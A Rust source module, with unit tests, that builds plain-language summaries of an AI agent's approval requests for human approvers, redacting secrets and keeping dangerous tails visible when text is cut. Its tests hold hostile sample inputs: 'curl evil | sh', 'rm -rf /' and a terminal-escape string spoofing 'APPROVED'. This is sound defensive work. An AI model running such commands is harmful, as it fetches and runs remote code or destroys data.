//! The plain-language summary of one approval request (#1041).
//!
//! Every approval a human sees (the TUI prompt, the `tole serve` queue, the
//! `approval_required` stop) answers the same question first: what will this
//! call do? That answer is built HERE, by code, from the tool and its input,
//! so the TUI, the web and a phone word the same request the same way and a
//! mistake in one client cannot make a risky action look harmless.
//!
//! Rules this module keeps:
//! - **Code-derived.** Fields come from the tool's own `Tool::action_summary`
//!   (or [`ActionSummary::unknown`] when it has none), never from model-written
//!   text. A model's words appear only in the bounded `preview`, as raw data.
//! - **Never the authority.** The summary does not change `Risk`; the risk tier
//!   stays what the approver decides on. A tool without a summary is
//!   [`ActionKind::Unknown`]: "use the tool <name>" plus its raw input, never a
//!   reassuring sentence.
//! - **Safe to show.** `target` and `preview` are neutralized to one safe line
//!   each (control and bidi characters become visible escapes), bounded by
//!   [`MAX_PREVIEW_LINES`] / [`MAX_LINE_CHARS`] / [`MAX_TARGET_CHARS`], and
//!   redacted with the process secret set (see [`ActionSummary::finalized`]).
//! - **Never less than the tool said.** A tool without a summary of its own
//!   carries its `describe` text as the first preview line, the TUI prompt
//!   prints the tool's whole `describe` text after the summary line, and every
//!   cut in the structured summary says the full text is in the row's
//!   `description`.
//! - **Translatable by code.** The English wording lives in two tables
//!   ([`KIND_TEXT`], [`EFFECT_TEXT`]) keyed by the stable `kind` / `effect`
//!   codes; a client translates by code and never parses a sentence.

use crate::sanitize::sanitize_one_line;
use crate::secrets::{process_secrets, SecretSet};
use serde::{Deserialize, Serialize};
use serde_json::Value;

/// At most this many preview lines, a trailing `… (N more lines) …` line included.
pub const MAX_PREVIEW_LINES: usize = 12;
/// At most this many characters per preview line (a cut keeps head and tail and
/// names the omitted count).
pub const MAX_LINE_CHARS: usize = 400;
/// At most this many characters of `target`. A cut keeps the head AND the tail
/// and names the omitted count (`… (N more characters) …`), and sets
/// `targetTruncated`.
pub const MAX_TARGET_CHARS: usize = 1000;
/// At most this many entries of a list (an allowlist, the participants) get a
/// line each; the rest are counted in a `+N more entries` line.
pub const MAX_LIST_ENTRIES: usize = 6;
/// A cut around a marker keeps at least this many characters on each side.
const MIN_EDGE: usize = 8;
/// A model-sent name is cut to this many characters (a cut keeps head and tail).
pub const MAX_NAME_CHARS: usize = 96;
/// Every cut says this, so a client and a person know where the whole text is:
/// the approval row's `description` (and the TUI prompt) carry the tool's own
/// text uncut.
pub const SEE_FULL: &str = "see the full description";

/// What the call is, as a stable code.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ActionKind {
    CreateFile,
    ReplaceFile,
    DeleteFile,
    RunProgram,
    UseConnectedTool,
    StartDiscussion,
    Delegate,
    /// Any tool without a summary of its own, and any code a newer version
    /// sent that this one does not know.
    #[serde(other)]
    Unknown,
}

/// What the call does to the world, as a stable code.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ActionEffect {
    /// A new file appears; nothing is replaced.
    Adds,
    /// Existing content is overwritten and no copy is kept.
    ReplacesNoBackup,
    /// Gone for good.
    CannotBeUndone,
    /// Starts a program that can do whatever the user account can.
    RunsProgram,
    /// Calls a connected tool; what it does is decided by that tool.
    UsesConnectedTool,
    /// Starts a discussion that spends the budget.
    StartsDiscussion,
    /// Starts a child session that can act on its own.
    StartsChild,
    /// Nothing is known about the effect; read the details.
    #[serde(other)]
    Unknown,
}

impl ActionKind {
    pub const ALL: [ActionKind; 8] = [
        ActionKind::CreateFile,
        ActionKind::ReplaceFile,
        ActionKind::DeleteFile,
        ActionKind::RunProgram,
        ActionKind::UseConnectedTool,
        ActionKind::StartDiscussion,
        ActionKind::Delegate,
        ActionKind::Unknown,
    ];

    /// The wire code (`create_file`, ...).
    pub fn code(self) -> &'static str {
        match self {
            ActionKind::CreateFile => "create_file",
            ActionKind::ReplaceFile => "replace_file",
            ActionKind::DeleteFile => "delete_file",
            ActionKind::RunProgram => "run_program",
            ActionKind::UseConnectedTool => "use_connected_tool",
            ActionKind::StartDiscussion => "start_discussion",
            ActionKind::Delegate => "delegate",
            ActionKind::Unknown => "unknown",
        }
    }

    /// The English phrase, `{target}` standing for the target.
    pub fn text(self) -> &'static str {
        KIND_TEXT
            .iter()
            .find(|(k, _)| *k == self)
            .map_or("use the tool {target}", |(_, t)| t)
    }
}

impl ActionEffect {
    pub const ALL: [ActionEffect; 8] = [
        ActionEffect::Adds,
        ActionEffect::ReplacesNoBackup,
        ActionEffect::CannotBeUndone,
        ActionEffect::RunsProgram,
        ActionEffect::UsesConnectedTool,
        ActionEffect::StartsDiscussion,
        ActionEffect::StartsChild,
        ActionEffect::Unknown,
    ];

    /// The wire code (`adds`, ...).
    pub fn code(self) -> &'static str {
        match self {
            ActionEffect::Adds => "adds",
            ActionEffect::ReplacesNoBackup => "replaces_no_backup",
            ActionEffect::CannotBeUndone => "cannot_be_undone",
            ActionEffect::RunsProgram => "runs_program",
            ActionEffect::UsesConnectedTool => "uses_connected_tool",
            ActionEffect::StartsDiscussion => "starts_discussion",
            ActionEffect::StartsChild => "starts_child",
            ActionEffect::Unknown => "unknown",
        }
    }

    /// The English sentence for the effect.
    pub fn text(self) -> &'static str {
        EFFECT_TEXT
            .iter()
            .find(|(e, _)| *e == self)
            .map_or("Effect unknown: read the details.", |(_, t)| t)
    }
}

/// English wording of each kind. The one place sentences about a kind live.
pub const KIND_TEXT: &[(ActionKind, &str)] = &[
    (ActionKind::CreateFile, "create the file {target}"),
    (ActionKind::ReplaceFile, "change the file {target}"),
    (ActionKind::DeleteFile, "delete the file {target}"),
    (ActionKind::RunProgram, "run the program {target}"),
    (
        ActionKind::UseConnectedTool,
        "use the connected tool {target}",
    ),
    (
        ActionKind::StartDiscussion,
        "start a discussion with {target}",
    ),
    (ActionKind::Delegate, "delegate a task to {target}"),
    (ActionKind::Unknown, "use the tool {target}"),
];

/// English wording of each effect. The one place sentences about an effect live.
pub const EFFECT_TEXT: &[(ActionEffect, &str)] = &[
    (
        ActionEffect::Adds,
        "Adds a new file: it did not exist when asked. Nothing is replaced.",
    ),
    (
        ActionEffect::ReplacesNoBackup,
        "Replaces content that was already there when asked. No backup is kept.",
    ),
    (ActionEffect::CannotBeUndone, "Cannot be undone."),
    (
        ActionEffect::RunsProgram,
        "Runs a program that can do anything your account can do.",
    ),
    (
        ActionEffect::UsesConnectedTool,
        "Uses a connected tool. What it does is decided by that tool, not by Tole.",
    ),
    (
        ActionEffect::StartsDiscussion,
        "Starts a discussion that spends part of your budget.",
    ),
    (
        ActionEffect::StartsChild,
        "Starts a child session that acts on its own.",
    ),
    (ActionEffect::Unknown, "Effect unknown: read the details."),
];

/// The summary of one approval request.
///
/// Wire shape (camelCase, like the rest of the approval row): `kind`, `target`,
/// `effect`, `insideWorkspace`, `targetTruncated`, `preview` (lines),
/// `previewTruncated`. Every field but `kind`, `target` and `effect` has a default, so a row from a
/// version without it, or with fewer fields, still loads.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ActionSummary {
    pub kind: ActionKind,
    /// A path relative to the working folder, a command line, or a tool name.
    pub target: String,
    pub effect: ActionEffect,
    /// True only when the tool confirmed the target resolves inside the
    /// working folder (the jail root). False for programs and connected tools.
    #[serde(default)]
    pub inside_workspace: bool,
    /// True when `target` was cut (the cut is also marked inside the text).
    #[serde(default)]
    pub target_truncated: bool,
    /// Bounded raw detail: diff lines (`+`/`-`), the command, or the input.
    #[serde(default)]
    pub preview: Vec<String>,
    /// True when `preview` is not the whole of it.
    #[serde(default)]
    pub preview_truncated: bool,
}

impl ActionSummary {
    /// `target` is redacted with the process secrets FIRST, neutralized to one
    /// safe line, and only then cut (head and tail kept, the omitted count
    /// named), so a secret straddling the cut cannot leave a prefix behind.
    pub fn new(
        kind: ActionKind,
        target: impl AsRef<str>,
        effect: ActionEffect,
        inside_workspace: bool,
    ) -> Self {
        let (target, cut_target) = bound_target(target.as_ref(), &process_secrets());
        let target_truncated = cut_target || has_cut_marker(&target);
        Self {
            kind,
            target,
            effect,
            inside_workspace,
            target_truncated,
            preview: Vec::new(),
            preview_truncated: false,
        }
    }

    /// Sets the preview from `lines`. The lines are redacted as ONE text (so a
    /// multi-line secret is found) before they are neutralized and cut.
    pub fn with_preview<I, S>(mut self, lines: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let lines: Vec<String> = lines.into_iter().map(|l| l.as_ref().to_string()).collect();
        if lines.is_empty() {
            self.preview = Vec::new();
            self.preview_truncated = false;
            return self;
        }
        let joined = lines.join("\n");
        let redacted = process_secrets().redact(&joined).into_owned();
        let (preview, truncated) = bound_lines(redacted.split('\n'));
        self.preview = preview;
        self.preview_truncated = truncated;
        self
    }

    /// The summary of a tool that has none: "use the tool <name>", its raw
    /// input as the preview, effect unknown. Deliberately says nothing
    /// reassuring.
    pub fn unknown(tool: &str, input: &Value) -> Self {
        Self::new(ActionKind::Unknown, tool, ActionEffect::Unknown, false)
            .with_preview(raw_input_lines(input))
    }

    /// [`Self::unknown`] for a tool that has no summary of its own, with the
    /// tool's `describe` text (the resolved destination, the exact argv, ...)
    /// as the FIRST preview line, so a summary never shows less than the tool
    /// said about itself. The text is redacted, neutralized and bounded like
    /// every preview line; a cut names where the whole text is.
    pub fn unknown_with_description(tool: &str, input: &Value, description: &str) -> Self {
        let mut lines = vec![format!("the tool's own description: {description}")];
        lines.extend(raw_input_lines(input));
        Self::new(ActionKind::Unknown, tool, ActionEffect::Unknown, false).with_preview(lines)
    }

    /// One English line: `"<kind phrase> — <effect sentence>"`.
    pub fn sentence(&self) -> String {
        format!("{} — {}", self.headline(), self.effect.text())
    }

    /// The kind phrase with the target filled in, e.g. `create the file a.txt`.
    pub fn headline(&self) -> String {
        self.kind.text().replace("{target}", &self.target)
    }

    /// The summary as the approver and every client get it: redacted with
    /// `secrets` (target as one text, preview as one text), then neutralized
    /// and bounded again, because a tool could have set the public fields
    /// directly.
    pub fn finalized(&self, secrets: &SecretSet) -> Self {
        let (target, cut_target) = bound_target(&self.target, secrets);
        let target_truncated = self.target_truncated || cut_target || has_cut_marker(&target);
        let joined = self.preview.join("\n");
        let redacted = secrets.redact(&joined).into_owned();
        let (preview, truncated) = if self.preview.is_empty() {
            (Vec::new(), false)
        } else {
            bound_lines(redacted.split('\n'))
        };
        Self {
            kind: self.kind,
            target,
            effect: self.effect,
            inside_workspace: self.inside_workspace,
            target_truncated,
            preview,
            preview_truncated: self.preview_truncated || truncated,
        }
    }
}

/// `s` cut to at most `max` characters with the head AND the tail kept and the
/// omitted count named in the middle (`… (N more characters) …`): a dangerous
/// tail is never hidden behind a harmless head. The flag says whether it cut.
fn cut(s: &str, max: usize) -> (String, bool) {
    let total = s.chars().count();
    if total <= max {
        return (s.to_string(), false);
    }
    // The count has at most as many digits as `total`, so this bounds the marker.
    let marker_room = format!("… ({total} more characters, {SEE_FULL}) …")
        .chars()
        .count();
    let budget = max.saturating_sub(marker_room);
    // Too small for a readable head and tail around the marker: keep a head
    // and a bare `…`, so the result is never longer than the cap.
    if budget < 2 * MIN_EDGE {
        let mut out: String = s.chars().take(max.saturating_sub(1)).collect();
        out.push('…');
        return (out, true);
    }
    let tail = budget / 2;
    let head = budget - tail;
    let omitted = total - head - tail;
    let mut out: String = s.chars().take(head).collect();
    out.push_str(&format!("… ({omitted} more characters, {SEE_FULL}) …"));
    out.extend(s.chars().skip(total - tail));
    (out, true)
}

/// `text` redacted, neutralized to one line, then cut ([`cut`]).
fn bound_target(text: &str, secrets: &SecretSet) -> (String, bool) {
    cut(&sanitize_one_line(&secrets.redact(text)), MAX_TARGET_CHARS)
}

/// Lines (already redacted) neutralized and cut; more than
/// [`MAX_PREVIEW_LINES`] keeps the first ones and ends with a
/// `… (N more lines) …` line, so the total stays within the cap.
fn bound_lines<I, S>(lines: I) -> (Vec<String>, bool)
where
    I: IntoIterator<Item = S>,
    S: AsRef<str>,
{
    let all: Vec<S> = lines.into_iter().collect();
    let mut truncated = false;
    let keep = if all.len() > MAX_PREVIEW_LINES {
        MAX_PREVIEW_LINES - 1
    } else {
        all.len()
    };
    let mut out: Vec<String> = Vec::with_capacity(keep + 1);
    for line in all.iter().take(keep) {
        let (l, cut_it) = cut(&sanitize_one_line(line.as_ref()), MAX_LINE_CHARS);
        // A `… (N more lines) …` line a builder put in (a diff side) counts
        // as a cut too; a user line that mimics it only sets the flag.
        truncated |= cut_it || has_cut_marker(&l);
        out.push(l);
    }
    if all.len() > keep {
        truncated = true;
        out.push(format!("… ({} more lines, {SEE_FULL}) …", all.len() - keep));
    }
    (out, truncated)
}

/// True when a line carries one of this module's cut markers (a diff side, a
/// list, a `short_name`, a cut line). Text from the model that mimics it only
/// sets a flag.
fn has_cut_marker(text: &str) -> bool {
    text.contains(SEE_FULL)
}

/// `text` redacted with the process secrets as ONE text, so a secret that
/// spans lines is found before anything is split or cut.
pub fn redacted_text(text: &str) -> String {
    process_secrets().redact(text).into_owned()
}

/// The summary of a call that starts a child session. `policy` lines say what
/// the human grants (allowlist, mode, budget, ...) and come FIRST, then the
/// task text. The profile is a string the model sent: it is shown as
/// "requested by the model", not as a validated profile.
pub fn delegate_summary(profile: Option<&str>, task: &str, policy: &[String]) -> ActionSummary {
    let target = match profile {
        Some(p) => format!("profile {} (requested by the model)", short_name(p)),
        None => "a new child session".to_string(),
    };
    let task = redacted_text(task);
    let lines: Vec<String> = policy
        .iter()
        .cloned()
        .chain(task.lines().map(|l| format!("task (from the model): {l}")))
        .collect();
    ActionSummary::new(
        ActionKind::Delegate,
        target,
        ActionEffect::StartsChild,
        false,
    )
    .with_preview(lines)
}

/// A model-sent name bounded to [`MAX_NAME_CHARS`] for a target or policy
/// line: redacted as a whole FIRST, then neutralized, then cut (a cut carries
/// the marker, which also sets the summary's truncation flag).
pub fn short_name(s: &str) -> String {
    cut(&sanitize_one_line(&redacted_text(s)), MAX_NAME_CHARS).0
}

/// The allow patterns a call asks for, parsed EXACTLY as `agent_start` and
/// `delegate` execute do: a JSON array's string entries; anything else (a lone
/// string, non-string entries) is not a request, and an empty result means the
/// child inherits. Execute and the summary both call this, so the summary
/// cannot show a list the call will not use.
pub fn requested_allow(input: &Value) -> Vec<String> {
    input
        .get("allow")
        .and_then(Value::as_array)
        .map(|a| {
            a.iter()
                .filter_map(Value::as_str)
                .map(str::to_string)
                .collect()
        })
        .unwrap_or_default()
}

/// The task text a call will run: the first of `keys` whose value is a string
/// (so a non-string `task` falls through to `prompt`), and only when it is not
/// blank. Shared by `agent_start` (`["prompt"]`), `delegate` (`["task",
/// "prompt"]`) and their summaries.
pub fn task_text(input: &Value, keys: &[&str]) -> Option<String> {
    keys.iter()
        .find_map(|k| input.get(*k).and_then(Value::as_str))
        .map(str::to_string)
        .filter(|t| !t.trim().is_empty())
}

/// The budget numbers a `delegate` call carves: `tokens`, `steps`, `minutes`
/// of its `budget` object, each only when it is an unsigned integer. Shared by
/// `delegate` and its summary.
pub fn budget_numbers(input: &Value) -> (Option<u64>, Option<u64>, Option<u64>) {
    let b = input.get("budget");
    let num = |k: &str| b.and_then(|b| b.get(k)).and_then(Value::as_u64);
    (num("tokens"), num("steps"), num("minutes"))
}

/// One preview line per entry (at most [`MAX_LIST_ENTRIES`]), then a
/// `+N more entries` line, so a list the human is granting is never one long
/// line cut in the middle. An empty list says `none`.
pub fn list_lines(label: &str, items: &[String]) -> Vec<String> {
    if items.is_empty() {
        return vec![format!("{label}: none")];
    }
    let mut out: Vec<String> = items
        .iter()
        .take(MAX_LIST_ENTRIES)
        .map(|i| format!("{label}: {i}"))
        .collect();
    if items.len() > MAX_LIST_ENTRIES {
        out.push(format!(
            "{label}: +{} more entries, {SEE_FULL}",
            items.len() - MAX_LIST_ENTRIES
        ));
    }
    out
}

/// The budget line of a `delegate` call: the values the call will really use
/// ([`budget_numbers`]) and a note when the budget holds anything else, which
/// the call ignores. `None` when no budget was sent.
pub fn budget_line(label: &str, input: &Value) -> Option<String> {
    let b = input.get("budget")?;
    let (tokens, steps, minutes) = budget_numbers(input);
    let mut parts: Vec<String> = [("tokens", tokens), ("steps", steps), ("minutes", minutes)]
        .into_iter()
        .filter_map(|(k, v)| v.map(|v| format!("{k}={v}")))
        .collect();
    if parts.is_empty() {
        parts.push("nothing usable (omitted parts take half of what is left)".into());
    }
    let known = ["tokens", "steps", "minutes"];
    let clean = b.as_object().is_some_and(|o| {
        o.iter()
            .all(|(k, v)| known.contains(&k.as_str()) && v.as_u64().is_some())
    });
    if !clean {
        parts.push("(anything else in the budget is ignored)".into());
    }
    Some(format!("{label}: {}", parts.join(" ")))
}

/// `target` relative to `root`, `/`-separated, for display only: a component
/// that is not valid UTF-8 is shown lossy and the text says so (the path is
/// still the real one, never a reason to call the call refused). `.` for the
/// root itself. `None` only when `target` is not under `root`.
pub fn relative_lossy(target: &std::path::Path, root: &std::path::Path) -> Option<String> {
    let rel = target.strip_prefix(root).ok()?;
    let mut lossy = false;
    let parts: Vec<String> = rel
        .components()
        .map(|c| {
            let s = c.as_os_str();
            s.to_str().map_or_else(
                || {
                    lossy = true;
                    s.to_string_lossy().into_owned()
                },
                str::to_string,
            )
        })
        .collect();
    let mut out = if parts.is_empty() {
        ".".to_string()
    } else {
        parts.join("/")
    };
    if lossy {
        out.push_str(" (the name is not valid UTF-8, shown lossy)");
    }
    Some(out)
}

/// A summary for a call the tool will refuse (a path outside the working
/// folder, one that does not resolve): kind and effect unknown, the reason as
/// the detail, never a sentence that reads as "this will happen".
pub fn refused(tool: &str, why: &str, path: &str) -> ActionSummary {
    ActionSummary::new(ActionKind::Unknown, tool, ActionEffect::Unknown, false)
        .with_preview([format!("{why}: {path}")])
}

/// The raw input as preview lines: compact JSON of the input redacted
/// structure-first (`redact_value`, so JSON escaping cannot hide a secret), or
/// nothing for no input.
pub fn raw_input_lines(input: &Value) -> Vec<String> {
    match input {
        Value::Null => Vec::new(),
        other => vec![process_secrets().redact_value(other).to_string()],
    }
}

/// Diff-style preview lines: `- ` for each line of `old`, `+ ` for each of
/// `new`, each side redacted as one text first. Both sides stay visible under
/// the line cap: when both are present each gets half of it, and a side that
/// is longer shows its head and a `… (N more lines) …` line. A lone side
/// (a new file) gets the whole cap.
pub fn diff_lines(old: &str, new: &str) -> Vec<String> {
    let old = redacted_text(old);
    let new = redacted_text(new);
    let (o, n): (Vec<&str>, Vec<&str>) = (old.lines().collect(), new.lines().collect());
    let (bo, bn) = match (o.is_empty(), n.is_empty()) {
        (false, false) => (MAX_PREVIEW_LINES / 2, MAX_PREVIEW_LINES / 2),
        (false, true) => (MAX_PREVIEW_LINES, 0),
        (true, _) => (0, MAX_PREVIEW_LINES),
    };
    let mut out = side_lines('-', &o, bo);
    out.extend(side_lines('+', &n, bn));
    out
}

fn side_lines(mark: char, lines: &[&str], budget: usize) -> Vec<String> {
    if lines.len() <= budget {
        return lines.iter().map(|l| format!("{mark} {l}")).collect();
    }
    let keep = budget.saturating_sub(1);
    let mut out: Vec<String> = lines[..keep]
        .iter()
        .map(|l| format!("{mark} {l}"))
        .collect();
    out.push(format!(
        "{mark} … ({} more lines, {SEE_FULL}) …",
        lines.len() - keep
    ));
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn every_code_has_one_english_row() {
        for k in ActionKind::ALL {
            assert_eq!(KIND_TEXT.iter().filter(|(c, _)| *c == k).count(), 1);
            assert!(k.text().contains("{target}"), "{k:?}");
        }
        for e in ActionEffect::ALL {
            assert_eq!(EFFECT_TEXT.iter().filter(|(c, _)| *c == e).count(), 1);
            assert!(!e.text().is_empty());
        }
        assert_eq!(KIND_TEXT.len(), ActionKind::ALL.len());
        assert_eq!(EFFECT_TEXT.len(), ActionEffect::ALL.len());
    }

    #[test]
    fn codes_are_the_serde_names() {
        for k in ActionKind::ALL {
            assert_eq!(json!(k), json!(k.code()));
        }
        for e in ActionEffect::ALL {
            assert_eq!(json!(e), json!(e.code()));
        }
    }

    #[test]
    fn unknown_tool_is_neutral_and_carries_the_raw_input() {
        let s = ActionSummary::unknown("frobnicate", &json!({"x": 1}));
        assert_eq!(s.kind, ActionKind::Unknown);
        assert_eq!(s.effect, ActionEffect::Unknown);
        assert!(!s.inside_workspace);
        assert_eq!(s.headline(), "use the tool frobnicate");
        assert_eq!(s.preview, vec![r#"{"x":1}"#.to_string()]);
        let text = s.sentence().to_lowercase();
        for reassuring in ["safe", "harmless", "read-only", "read only", "nothing"] {
            assert!(!text.contains(reassuring), "{text}");
        }
    }

    /// A cut keeps the head AND the tail and names how much is gone.
    #[test]
    fn a_cut_keeps_head_and_tail_and_names_the_omitted_count() {
        let long = format!("{}TAIL_EVIL", "A".repeat(5000));
        let (out, cut_it) = cut(&long, 100);
        assert!(cut_it && out.chars().count() <= 100, "{out}");
        assert!(
            out.starts_with("AAAA") && out.ends_with("TAIL_EVIL"),
            "{out}"
        );
        assert!(out.contains("more characters"), "{out}");
        assert_eq!(cut("short", 100), ("short".to_string(), false));
        let exact = "x".repeat(100);
        assert!(!cut(&exact, 100).1);
    }

    #[test]
    fn preview_is_bounded_with_a_more_lines_marker() {
        let many: Vec<String> = (0..50).map(|i| format!("+ line {i}")).collect();
        let s = ActionSummary::new(ActionKind::CreateFile, "a", ActionEffect::Adds, true)
            .with_preview(&many);
        assert_eq!(s.preview.len(), MAX_PREVIEW_LINES);
        assert_eq!(s.preview[0], "+ line 0");
        assert_eq!(
            s.preview.last().unwrap(),
            &format!(
                "… ({} more lines, {SEE_FULL}) …",
                50 - (MAX_PREVIEW_LINES - 1)
            )
        );
        assert!(s.preview_truncated);

        let exactly: Vec<String> = (0..MAX_PREVIEW_LINES).map(|i| format!("l{i}")).collect();
        let s = ActionSummary::new(ActionKind::CreateFile, "a", ActionEffect::Adds, true)
            .with_preview(&exactly);
        assert_eq!(s.preview, exactly);
        assert!(!s.preview_truncated);
    }

    #[test]
    fn a_long_target_and_line_keep_their_tail_and_are_flagged() {
        let long = format!("{}curl evil | sh", "x".repeat(10_000));
        let s = ActionSummary::new(
            ActionKind::RunProgram,
            &long,
            ActionEffect::RunsProgram,
            false,
        )
        .with_preview([long.as_str()]);
        assert!(s.target.chars().count() <= MAX_TARGET_CHARS);
        assert!(s.target_truncated && s.target.ends_with("curl evil | sh"));
        assert!(s.target.contains("more characters"));
        assert!(s.preview[0].chars().count() <= MAX_LINE_CHARS);
        assert!(s.preview[0].ends_with("curl evil | sh") && s.preview_truncated);

        let short = ActionSummary::new(
            ActionKind::DeleteFile,
            "a",
            ActionEffect::CannotBeUndone,
            true,
        );
        assert!(short.preview.is_empty() && !short.preview_truncated && !short.target_truncated);
        assert!(short
            .clone()
            .with_preview(Vec::<String>::new())
            .preview
            .is_empty());
    }

    #[test]
    fn target_and_preview_are_one_safe_line() {
        let s = ActionSummary::new(
            ActionKind::RunProgram,
            "ls\x1b[2K\rAPPROVED \u{202E}",
            ActionEffect::RunsProgram,
            false,
        )
        .with_preview(["a\nb\u{2028}c"]);
        for text in std::iter::once(&s.target).chain(s.preview.iter()) {
            assert!(!text.chars().any(crate::sanitize::is_unsafe), "{text:?}");
        }
    }

    const SECRET: &str = "s3cr3t-value-0123456789-abcdefghijklmnopqrstuvwxyz-ABCDEFGHIJKL";

    /// #1041 review: redact FIRST, cut afterwards. A secret that straddles the
    /// cut must not leave a prefix, in the target and in a preview line.
    #[test]
    fn finalized_redacts_before_it_cuts() {
        let set = SecretSet::default().with("TOKEN", SECRET);
        for pad in [
            MAX_TARGET_CHARS - 20,
            MAX_TARGET_CHARS - 1,
            MAX_TARGET_CHARS - 40,
        ] {
            let mut s = ActionSummary::new(
                ActionKind::RunProgram,
                "x",
                ActionEffect::RunsProgram,
                false,
            );
            s.target = format!("{}{SECRET} tail", "y".repeat(pad));
            let f = s.finalized(&set);
            assert!(!f.target.contains("s3cr3t"), "{}", f.target);
            assert!(f.target.contains("«TOKEN»"), "{}", f.target);
        }
        for pad in [MAX_LINE_CHARS - 20, MAX_LINE_CHARS - 1, MAX_LINE_CHARS - 40] {
            let mut s = ActionSummary::new(ActionKind::Unknown, "x", ActionEffect::Unknown, false);
            s.preview = vec![format!("{}{SECRET} tail", "y".repeat(pad))];
            let f = s.finalized(&set);
            assert!(!f.preview[0].contains("s3cr3t"), "{}", f.preview[0]);
        }
    }

    /// A multi-line secret (a key) is redacted before the lines are split.
    #[test]
    fn finalized_redacts_a_multi_line_secret_before_splitting() {
        let key = "-----BEGIN KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n-----END KEY-----";
        let set = SecretSet::default().with("PEM", key);
        let mut s = ActionSummary::new(ActionKind::Unknown, "x", ActionEffect::Unknown, false);
        s.preview = vec![key.to_string()];
        let f = s.finalized(&set);
        let all = f.preview.join("\n");
        assert!(!all.contains("MIIEvQ") && all.contains("«PEM»"), "{all}");
    }

    /// A row from a version without the optional fields, and one with a kind
    /// this version does not know, both load.
    #[test]
    fn older_and_newer_rows_still_deserialize() {
        let old: ActionSummary =
            serde_json::from_value(json!({"kind":"create_file","target":"a","effect":"adds"}))
                .unwrap();
        assert!(!old.inside_workspace && old.preview.is_empty() && !old.preview_truncated);
        assert!(!old.target_truncated);
        let newer: ActionSummary = serde_json::from_value(
            json!({"kind":"teleport","target":"a","effect":"vanishes","insideWorkspace":true}),
        )
        .unwrap();
        assert_eq!(
            (newer.kind, newer.effect),
            (ActionKind::Unknown, ActionEffect::Unknown)
        );
        #[derive(Deserialize)]
        struct Row {
            #[serde(default)]
            summary: Option<ActionSummary>,
        }
        let row: Row = serde_json::from_value(json!({"id":"apr-1","tool":"write_file"})).unwrap();
        assert!(row.summary.is_none());
    }

    #[test]
    fn diff_lines_mark_each_side() {
        assert_eq!(diff_lines("a\nb", "c"), vec!["- a", "- b", "+ c"]);
        assert!(diff_lines("", "").is_empty());
        assert_eq!(diff_lines("", "x\ny"), vec!["+ x", "+ y"]);
        assert_eq!(diff_lines("x", ""), vec!["- x"]);
    }

    /// A long removed block cannot push the new text out of the preview.
    #[test]
    fn a_long_old_side_leaves_the_new_side_visible() {
        let old: String = (0..30).map(|i| format!("old {i}\n")).collect();
        let lines = diff_lines(&old, "new one\nnew two\nrm -rf /\n");
        assert!(lines.len() <= MAX_PREVIEW_LINES, "{lines:?}");
        assert!(lines.iter().any(|l| l == "- old 0"), "{lines:?}");
        assert!(lines.iter().any(|l| l.starts_with("- … (")), "{lines:?}");
        for want in ["+ new one", "+ new two", "+ rm -rf /"] {
            assert!(lines.iter().any(|l| l == want), "{want}: {lines:?}");
        }
        // Both sides long: each keeps its head and says how much is missing.
        let new: String = (0..40).map(|i| format!("new {i}\n")).collect();
        let lines = diff_lines(&old, &new);
        assert!(lines.len() <= MAX_PREVIEW_LINES, "{lines:?}");
        assert!(lines.iter().any(|l| l == "+ new 0"), "{lines:?}");
        assert!(lines.iter().any(|l| l.starts_with("+ … (")), "{lines:?}");
    }

    /// A cut says where the whole text is, and every cut sets a flag.
    #[test]
    fn every_cut_names_the_full_description_and_sets_a_flag() {
        let long = "z".repeat(5000);
        let s = ActionSummary::new(
            ActionKind::RunProgram,
            &long,
            ActionEffect::RunsProgram,
            false,
        )
        .with_preview([long.as_str()]);
        assert!(s.target.contains(SEE_FULL) && s.target_truncated);
        assert!(s.preview[0].contains(SEE_FULL) && s.preview_truncated);
        let many: Vec<String> = (0..40).map(|i| format!("l{i}")).collect();
        let m = s.clone().with_preview(&many);
        assert!(m.preview.last().unwrap().contains(SEE_FULL) && m.preview_truncated);
    }

    /// A model-sent name is redacted as a whole BEFORE it is cut to 48
    /// characters, and a cut name sets the flags.
    #[test]
    fn short_name_redacts_before_it_cuts_and_flags_a_cut() {
        let set = SecretSet::default().with("TOK", SECRET);
        crate::secrets::set_process_secrets(crate::secrets::process_secrets().with("TOK", SECRET));
        let name = short_name(&format!("{SECRET}-tail"));
        assert!(!name.contains("s3cr3t"), "{name}");
        assert!(name.contains("«TOK»"), "{name}");
        let padded = short_name(&format!("{} {SECRET}", "p".repeat(30)));
        assert!(
            !padded.contains("s3cr3t") && !padded.contains("ABCDEFGHIJKL"),
            "{padded}"
        );
        // A plain long name is cut, marked, and the summary says so.
        let long = short_name(&"n".repeat(200));
        assert!(long.contains(SEE_FULL));
        let s = ActionSummary::new(
            ActionKind::Delegate,
            format!("profile {long}"),
            ActionEffect::StartsChild,
            false,
        )
        .with_preview([format!("mode: {long}")]);
        assert!(s.target_truncated && s.preview_truncated);
        let _ = set;
    }

    #[test]
    fn lists_get_one_line_per_entry_and_a_more_entries_line() {
        let few = vec!["a".to_string(), "b".to_string()];
        assert_eq!(list_lines("allow", &few), ["allow: a", "allow: b"]);
        assert_eq!(list_lines("allow", &[]), ["allow: none"]);
        let many: Vec<String> = (0..20).map(|i| format!("p{i}")).collect();
        let lines = list_lines("allow", &many);
        assert_eq!(lines.len(), MAX_LIST_ENTRIES + 1);
        assert_eq!(
            lines.last().unwrap(),
            &format!("allow: +{} more entries, {SEE_FULL}", 20 - MAX_LIST_ENTRIES)
        );
        let s = ActionSummary::new(ActionKind::Delegate, "x", ActionEffect::StartsChild, false)
            .with_preview(&lines);
        assert!(s.preview_truncated);
        // The shared parsers are the ones execute uses.
        assert_eq!(
            requested_allow(&json!({"allow": ["a", 1, "b"]})),
            ["a", "b"]
        );
        assert!(requested_allow(&json!({"allow": "solo"})).is_empty());
        assert!(requested_allow(&json!({})).is_empty());
        assert_eq!(
            task_text(&json!({"task": 5, "prompt": "run me"}), &["task", "prompt"]).as_deref(),
            Some("run me")
        );
        assert_eq!(task_text(&json!({"task": "  "}), &["task", "prompt"]), None);
